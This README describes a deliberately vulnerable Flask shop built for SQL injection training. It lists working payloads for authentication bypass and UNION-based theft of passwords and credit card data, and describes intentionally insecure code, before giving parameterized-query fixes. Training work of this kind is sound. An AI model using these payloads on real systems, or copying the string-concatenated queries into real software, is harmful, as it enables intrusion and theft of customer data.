# TechHub Electronics - Vulnerable Flask Blueprint

A deliberately vulnerable Flask application designed for cybersecurity training and SQL injection education.

## ⚠️ WARNING
This application contains **intentional security vulnerabilities** for educational purposes only. It should **NEVER** be deployed to production or exposed to the internet.

## Overview

TechHub Electronics is an early 2000s-style e-commerce application with intentional SQL injection vulnerabilities. It's designed to teach students about:
- SQL injection attack vectors
- Authentication bypass techniques
- Data exfiltration methods
- The importance of parameterized queries
- Secure coding practices

## Features

### Educational Vulnerabilities
- **Product Search**: Vulnerable to SQL injection via search parameter
- **Customer Login**: Authentication bypass via SQL injection
- **Admin Login**: Same SQL injection vulnerability as customer login
- **Plain Text Storage**: Passwords and credit cards stored unencrypted
- **Verbose Error Messages**: SQL errors displayed to aid learning
- **No Input Sanitization**: Direct string concatenation in SQL queries

### Application Features
- Complete e-commerce functionality (browse, cart, checkout)
- Customer account management
- Order history tracking
- Admin panel for product and customer management
- Bulk customer upload via CSV
- Early 2000s web design aesthetic

## Quick Start

### Installation

1. Install Flask:
```bash
pip install flask
```

2. Run the application:
```bash
python app.py
```

3. Access the application:
```
http://localhost:5000
```

### Default Credentials

**Admin Panel:**
- Username: `admin`
- Password: `admin123`

**Sample Customer:**
- Username: `patricia.sandoval`
- Password: `password123`

## Architecture

### Clean Separation of Concerns

The application follows a clean architecture where **all configuration is handled by the blueprint**:

**app.py** (Clean and Simple)
```python
from flask import Flask, redirect, url_for
from techhub_blueprint import bp as techhub_bp, init_app

app = Flask(__name__)
app.register_blueprint(techhub_bp)
init_app(app)

@app.route('/')
def index():
    return redirect(url_for('techhub.index'))

if __name__ == '__main__':
    app.run(debug=True, port=5000)
```

**techhub_blueprint/__init__.py** (Configuration Handling)
- Sets Flask secret key
- Configures upload folder
- Initializes database
- Registers all routes

### Directory Structure

```
tech-hub/
├── app.py                          # Clean testing app
├── techhub_plan.md                 # Implementation specification
├── techhub_blueprint/
│   ├── __init__.py                 # Blueprint + configuration
│   ├── models.py                   # Database schema and seed data
│   ├── routes.py                   # All application routes
│   ├── utils.py                    # Helper functions
│   ├── static/
│   │   ├── css/style.css          # Early 2000s styling
│   │   ├── js/cart.js             # Shopping cart JS
│   │   └── uploads/products/       # Product images
│   └── templates/
│       ├── base.html              # Base template
│       ├── *.html                 # Public pages
│       └── admin/                 # Admin templates
└── .gitignore                      # Excludes DB and cache files
```

## SQL Injection Examples

### Product Search Vulnerability

**Normal Search:**
```
/techhub/products?search=gaming
```

**SQL Injection - Return All Products:**
```
/techhub/products?search=' OR '1'='1
```

**SQL Injection - Column Enumeration (8 columns in products table):**
```
/techhub/products?search=' UNION SELECT null,null,null,null,null,null,null,null --
```

**SQL Injection - Data Exfiltration (Extract Customer Data):**
```
/techhub/products?search=' UNION SELECT id,username,password,email,credit_card,cvv,expiration,null FROM customers --
```

The injected customer data will be displayed in the product grid as:
- **Field 1 (Title)**: Username (e.g., patricia.sandoval)
- **Field 2**: Password (e.g., password123)
- **Field 3**: Email
- **Field 4 (RED)**: 💳 Credit Card Number (e.g., 4532-1234-5678-9010)
- **Field 5**: CVV (e.g., 847)
- **Field 6**: Expiration Date (e.g., 03/27)
- **Field 7**: null
- **Field 8**: Customer ID

**SQL Injection - With Labeled Data (More Readable):**
```
/techhub/products?search=' UNION SELECT id,'User: ' || username,'Pass: ' || password,'Email: ' || email,'💳 CC: ' || credit_card,'CVV: ' || cvv,'Exp: ' || expiration,'ID: ' || id FROM customers --
```

### Login Bypass

**Authentication Bypass:**
- Username: `admin' --`
- Password: (anything)

**Login as First User:**
- Username: `' OR '1'='1' --`
- Password: (anything)

## Educational Use

### Learning Objectives

Students should be able to:
1. Discover SQL injection vulnerabilities through manual testing
2. Enumerate table columns using UNION SELECT
3. Extract sensitive data from the database
4. Bypass authentication mechanisms
5. Understand why parameterized queries prevent these attacks

### Logging

All vulnerable SQL queries are logged to the console with the prefix `[VULNERABLE SQL]` for educational visibility.

## Database Schema

The application uses SQLite with the following tables:
- `products` - Product catalog
- `customers` - User accounts (plain text passwords, unencrypted credit cards)
- `admins` - Administrator accounts
- `orders` - Order records
- `order_items` - Order line items

## Mitigation

To fix the SQL injection vulnerabilities, replace string concatenation with parameterized queries:

**Vulnerable Code:**
```python
query = f"SELECT * FROM products WHERE name LIKE '%{search}%'"
cursor.execute(query)
```

**Secure Code:**
```python
query = "SELECT * FROM products WHERE name LIKE ?"
cursor.execute(query, (f'%{search}%',))
```

## License

This is an educational project for authorized security testing and training purposes only.

## Acknowledgments

Based on the technical specification in `techhub_plan.md` - a comprehensive plan for creating a deliberately vulnerable Flask application for cybersecurity training.
